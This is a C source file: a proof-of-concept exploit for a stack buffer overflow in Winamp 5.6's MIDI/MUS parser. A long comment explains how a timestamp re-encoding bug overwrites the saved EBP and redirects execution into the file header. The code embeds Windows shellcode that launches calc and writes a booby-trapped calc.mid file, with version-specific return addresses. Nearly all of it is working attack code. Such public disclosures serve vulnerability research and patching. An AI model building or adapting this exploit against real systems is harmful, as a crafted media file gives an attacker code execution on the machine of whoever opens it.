/*
 * Winamp 5.6 Arbitrary Code Execution in MIDI Parser
 * Copyright (C) 2010 Kryptos Logic
 *
 * Bug discovered by Peter Wilhelmsen.
 * Exploit written by Morten Shearman Kirkegaard.
 */

/*
 * When Winamp plays MUS files and other MIDI variants, it begins by
 * converting them to a canonical format.
 *
 * IN_MIDI.DLL 0x076ED6D3
 * Timestamps in MUS and MIDI are 32 bit values encoded as a series of
 * bytes, with 7 bits in each byte. The most significant bit indicates
 * whether or not this is the last byte. Winamp can decode any value
 * without problems, but when it tries to re-encode them for the MIDI
 * data, it uses the naive approach of shifting multiples of 7 bits. On
 * x86 a shift of more than 31 bits does NOT result in a cleared
 * register, so after shifting 0, 7, 14, 21, and 28 bits, it will shift
 * 35 bits, resulting in a shift of only 3 bits. If the most significant
 * bit is set, Winamp will keep shifting forever. However, if it is
 * cleared, and one or more of the following three bits are set, it will
 * shift 0, 7, 14, 21, 28, 3, 10, 17, 24, and 31 bits. The last shift
 * will result in a fully cleared register, so only 9 output bytes are
 * generated. The allocated stack buffer is 8 bytes, so the least
 * significant byte will overflow into the saved EBP.
 *
 * IN_MIDI.DLL 0x076EE07F
 * The saved EBP is restored into the register before returning to the
 * main coversion function. If a value of 0x60 is written to the least
 * significant byte of EBP, the function will run to the end without
 * errors, but will use the sum of all timestamps encountered as its
 * return address. We choose a number of timestamps which add up to the
 * desired return address, and make sure that only the last timestamp
 * will cause an overflow. When the function returns, a pointer to the
 * input buffer is located at ESP+0x14. We return to an instruction
 * sequence of ADD ESP, 0x14; RET; so the execution will continue at the
 * MUS header.
 *
 * By choosing 0xC0 as the least significant byte of the scoreLen field,
 * the header becomes executable without touching memory. We choose the
 * most significant byte of scoreLen and the least significant byte of
 * scoreStart to make up a JMP instruction, skipping the rest of the
 * header and continuing execution in the instrument list, where the
 * desired shellcode is placed. More shellcode can be placed after the
 * note events in the score data, if needed.
 */

#include <inttypes.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>


unsigned char shellcode[] = {
/* http://www.shell-storm.org/shellcode/files/shellcode-662.php */
0xFC,0x31,0xD2,0xB2,0x30,0x64,0xFF,0x32,
0x5A,0x8B,0x52,0x0C,0x8B,0x52,0x14,0x8B,
0x72,0x28,0x31,0xC9,0xB1,0x18,0x31,0xFF,
0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,
0x20,0xC1,0xCF,0x0D,0x01,0xC7,0xE2,0xF0,
0x81,0xFF,0x5B,0xBC,0x4A,0x6A,0x8B,0x5A,
0x10,0x8B,0x12,0x75,0xDA,0x8B,0x53,0x3C,
0x01,0xDA,0xFF,0x72,0x34,0x8B,0x52,0x78,
0x01,0xDA,0x8B,0x72,0x20,0x01,0xDE,0x31,
0xC9,0x41,0xAD,0x01,0xD8,0x81,0x38,0x47,
0x65,0x74,0x50,0x75,0xF4,0x81,0x78,0x04,
0x72,0x6F,0x63,0x41,0x75,0xEB,0x81,0x78,
0x08,0x64,0x64,0x72,0x65,0x75,0xE2,0x49,
0x8B,0x72,0x24,0x01,0xDE,0x66,0x8B,0x0C,
0x4E,0x8B,0x72,0x1C,0x01,0xDE,0x8B,0x14,
0x8E,0x01,0xDA,0x52,0x68,0x78,0x65,0x63,
0x01,0xFE,0x4C,0x24,0x03,0x68,0x57,0x69,
0x6E,0x45,0x54,0x53,0xFF,0xD2,0x6A,0x00,
0x68,0x63,0x61,0x6C,0x63,0x6A,0x05,0x31,
0xC9,0x8D,0x4C,0x24,0x04,0x51,0xFF,0xD0,
0x68,0x65,0x73,0x73,0x01,0x89,0xFB,0xFE,
0x4C,0x24,0x03,0x68,0x50,0x72,0x6F,0x63,
0x68,0x45,0x78,0x69,0x74,0x54,0xFF,0x74,
0x24,0x24,0xFF,0x54,0x24,0x24,0x57,0xFF,
0xD0
};



void append_time(unsigned char **p, uint32_t t)
{
	int bytes;

	if ((t >> 28)) {
		bytes = 5;
	} else if ((t >> 21)) {
		bytes = 4;
	} else if ((t >> 14)) {
		bytes = 3;
	} else if ((t >> 7)) {
		bytes = 2;
	} else {
		bytes = 1;
	}

	switch (bytes) {
		case 5: *((*p)++) = 0x80 | ((t >> 28) & 0x7F);
		case 4: *((*p)++) = 0x80 | ((t >> 21) & 0x7F);
		case 3: *((*p)++) = 0x80 | ((t >> 14) & 0x7F);
		case 2: *((*p)++) = 0x80 | ((t >>  7) & 0x7F);
		case 1: *((*p)++) = 0x00 | ( t        & 0x7F);
	}
}



void append_note_event(unsigned char **p, uint32_t t)
{
	*((*p)++) = (1 << 7 /* last = true */)
	          | (1 << 4 /* type = play note */)
	          | (0 << 0 /* chan = 0 */);
	*((*p)++) = (0 << 7 /* vol = false */)
	          | (0 << 0 /* note */);
	append_time(p, t);
}



int main(void)
{
	struct {
		char magic[4];
		uint16_t scoreLen;
		uint16_t scoreStart;
		uint16_t channels;
		uint16_t sec_channels;
		uint16_t instrCnt;
		uint16_t dummy;
		uint16_t instruments[100];  /* enough for shellcode and for a good scoreStart value */
		unsigned char score[1024];
	} __attribute__((packed)) x;
	unsigned char *p;
	uint32_t ret =
		//0x0041E092  /* winamp.exe 5.581 */
		0x0041E22C  /* winamp.exe 5.6 */
	;
	uint8_t ebp =
		//0x70  /* 5.581, Windows 7 */
		//0x48  /* 5.581, Windows XP */
		//0x54  /* 5.60, Windows 7 */
		0x60  /* 5.60, Windows XP */
	;
	int fd;

	memset(&x, 'A', sizeof(x));

	x.magic[0] = 'M';     /* 4D      DEC EBP   */
	x.magic[1] = 'U';     /* 55      PUSH EBP  */
	x.magic[2] = 'S';     /* 53      PUSH EBX  */
	x.magic[3] = 0x1A;    /* 1A C0   SBB AL,AL */
	x.scoreLen = 0xEBC0;  /* EB 09   JMP +9    */
	x.scoreStart = 0x0109; /* must be >= 16+instrCnt*2 && < 16+instrCnt*4 */
	x.channels = 1;
	x.sec_channels = 0;
	x.instrCnt = sizeof(x.instruments) / sizeof(*x.instruments);
	x.dummy = 0;
	memcpy((void *)x.instruments, shellcode, sizeof(shellcode));

	p = (unsigned char *)x.score;

	ret -= 0x10000000 + ebp;  /* for the final overflow */
	while (ret >= 0x10000000) {
		append_note_event(&p, 0x0FFFFFFF);
		ret -= 0x0FFFFFFF;
	}
	append_note_event(&p, ret);
	append_note_event(&p, 0x10000000 + ebp);
	append_note_event(&p, 0);

	if ((fd = open("calc.mid", O_WRONLY|O_CREAT, 0644)) == -1) {
		perror("open(calc.mid) failed");
		return EXIT_FAILURE;
	}
	if ((write(fd, &x, sizeof(x))) != sizeof(x)) {
		perror("truncated write");
		return EXIT_FAILURE;
	}
	close(fd);

	return EXIT_SUCCESS;
}
